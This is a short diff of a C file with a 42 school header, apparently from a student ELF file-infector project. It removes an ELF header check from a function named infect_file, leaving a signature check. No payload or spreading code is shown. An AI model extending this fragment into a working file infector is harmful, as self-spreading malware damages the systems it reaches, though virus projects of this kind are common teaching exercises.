@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/03/04 11:29:15 by mbatty            #+#    #+#             */
-/*   Updated: 2026/03/04 11:33:30 by mbatty           ###   ########.fr       */
+/*   Updated: 2026/03/04 11:48:19 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -27,9 +27,6 @@ char	*strjoin(char const *s1, char const *s2);
 
 int	infect_file(const char *path)
 {
-	if (check_elf_hdr(path) == -1)
-		return (-1);
-
 	if (check_signature(path) == -1)
 		return (-1);
 
